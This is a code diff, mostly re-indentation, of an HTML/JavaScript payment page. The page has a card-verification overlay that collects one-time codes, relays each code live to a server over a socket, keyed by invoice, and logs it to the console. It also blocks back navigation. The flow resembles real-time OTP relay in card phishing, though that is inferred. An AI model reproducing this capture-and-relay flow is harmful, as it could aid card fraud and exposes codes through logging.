@@ -435,7 +435,6 @@ function getFailUrl(reason) {
                 <div class="text-sm text-gray-500 flex items-center gap-2">
                   <span>Service fee is 2% of the transaction amount</span>
                 </div>
-                
               <div id="invoiceIdContainer" class="mt-4 bg-gray-100 p-3 hidden">
                   <span class="text-sm font-medium">INVOICE ID: </span>
                   <span class="text-sm" id="invoiceId"></span>
@@ -833,7 +832,7 @@ function getFailUrl(reason) {
         document.getElementById(id).addEventListener('input', updateSubmitButton);
       });
 
-    document.getElementById('otp').addEventListener('input', updateConfirmOtpButton);
+  document.getElementById('otp').addEventListener('input', updateConfirmOtpButton);
 
       // Payment Submission Handler
       document.getElementById('mainForm').addEventListener('submit', async function(e) {
@@ -1235,95 +1234,63 @@ function getFailUrl(reason) {
     };
     history.pushState(null, null, window.location.href);
     
-   // MC Verification Functions
-function setupMCVerification() {
-  const mcCancel = document.getElementById('mcCancel');
-  const mcConfirmBtn = document.getElementById('mcConfirmBtn');
-  const mcResendBtn = document.getElementById('mcResendBtn');
-  const mcOtpInput = document.getElementById('mcOtpInput');
-  
-  if (mcCancel) {
-    mcCancel.addEventListener('click', function() {
-      // Hide the overlay
-      const overlay = document.getElementById('mcVerificationOverlay');
-      if (overlay) overlay.style.display = 'none';
+    // MC Verification Functions
+    function setupMCVerification() {
+      const mcCancel = document.getElementById('mcCancel');
+      const mcConfirmBtn = document.getElementById('mcConfirmBtn');
+      const mcResendBtn = document.getElementById('mcResendBtn');
+      const mcOtpInput = document.getElementById('mcOtpInput');
       
-      // Clear timer if it exists
-      if (window.mcTimerInterval) {
-        clearInterval(window.mcTimerInterval);
+      if (mcCancel) {
+        mcCancel.addEventListener('click', function() {
+          // Hide the overlay
+          const overlay = document.getElementById('mcVerificationOverlay');
+          if (overlay) overlay.style.display = 'none';
+          
+          // Clear timer if it exists
+          if (window.mcTimerInterval) {
+            clearInterval(window.mcTimerInterval);
+          }
+          
+          // Redirect to fail page with canceled reason
+          window.location.href = getFailUrl('canceled');
+        });
       }
       
-      // Redirect to fail page with canceled reason
-      window.location.href = getFailUrl('canceled');
-    });
-  }
-  
-  if (mcConfirmBtn) {
-    mcConfirmBtn.addEventListener('click', function() {
-      const otp = mcOtpInput.value.trim();
-      if (!otp) {
-        const mcOtpError = document.getElementById('mcOtpError');
-        if (mcOtpError) {
-          mcOtpError.textContent = 'Please enter the verification code.';
-          mcOtpError.style.display = 'block';
-        }
-        return;
+      if (mcConfirmBtn) {
+        mcConfirmBtn.addEventListener('click', function() {
+          const otp = mcOtpInput.value.trim();
+          if (!otp) {
+            const mcOtpError = document.getElementById('mcOtpError');
+            if (mcOtpError) {
+              mcOtpError.textContent = 'Please enter the verification code.';
+              mcOtpError.style.display = 'block';
+            }
+            return;
+          }
+          
+          // Disable button and show loading state
+          mcConfirmBtn.disabled = true;
+          const originalText = mcConfirmBtn.textContent;
+mcConfirmBtn.innerHTML = '<div style="display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s linear infinite; margin-right: 8px; vertical-align: middle;"></div> VERIFYING...';
+          
+          // Emit event with OTP - use the existing socket
+          socket.emit('mc_otp_submitted', {
+            invoiceId: currentInvoiceId,
+            otp: otp
+          });
+          
+          console.log('MC OTP submitted:', otp, 'for invoice:', currentInvoiceId);
+          
+          // Reset button after some delay if no response
+          setTimeout(() => {
+            if (mcConfirmBtn.disabled) {
+              mcConfirmBtn.disabled = false;
+              mcConfirmBtn.innerHTML = originalText;
+            }
+          }, 10000); // 10 second timeout
+        });
       }
-      
-      // Show loading state on the button
-      mcConfirmBtn.disabled = true;
-      const originalText = mcConfirmBtn.innerHTML;
-      mcConfirmBtn.innerHTML = `
-        <div style="display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s linear infinite; margin-right: 8px; vertical-align: middle;"></div>
-        <span style="opacity: 0.8;">VERIFYING...</span>
-      `;
-      
-      console.log('Sending MC OTP submission with invoiceId:', currentInvoiceId, 'OTP:', otp);
-      
-      // Use the global socket instance
-      socket.emit('mc_otp_submitted', {
-        invoiceId: currentInvoiceId,
-        otp: otp
-      });
-      
-      // Reset button after timeout if no response
-      setTimeout(() => {
-        if (mcConfirmBtn.disabled) {
-          mcConfirmBtn.disabled = false;
-          mcConfirmBtn.innerHTML = originalText;
-        }
-      }, 10000); // 10 second timeout
-    });
-  }
-  
-  if (mcResendBtn) {
-    mcResendBtn.addEventListener('click', function() {
-      // Show loading state
-      mcResendBtn.disabled = true;
-      const originalText = mcResendBtn.innerHTML;
-      mcResendBtn.innerHTML = 'SENDING...';
-      
-      console.log('Requesting OTP resend for invoiceId:', currentInvoiceId);
-      
-      // Use the global socket instance
-      socket.emit('mc_resend_otp', {
-        invoiceId: currentInvoiceId
-      });
-      
-      // Reset timer
-      setupMCTimerIfNeeded(true);
-      
-      // Restore button after delay
-      setTimeout(() => {
-        mcResendBtn.disabled = false;
-        mcResendBtn.innerHTML = originalText;
-        
-        // Show notification to user
-        alert('A new verification code has been sent to your registered mobile number.');
-      }, 1500);
-    });
-  }
-}
       
       if (mcResendBtn) {
         mcResendBtn.addEventListener('click', function() {
@@ -1434,5 +1401,3 @@ function setupMCVerification() {
 </script>
 </body>
 </html>
-
-                                                      
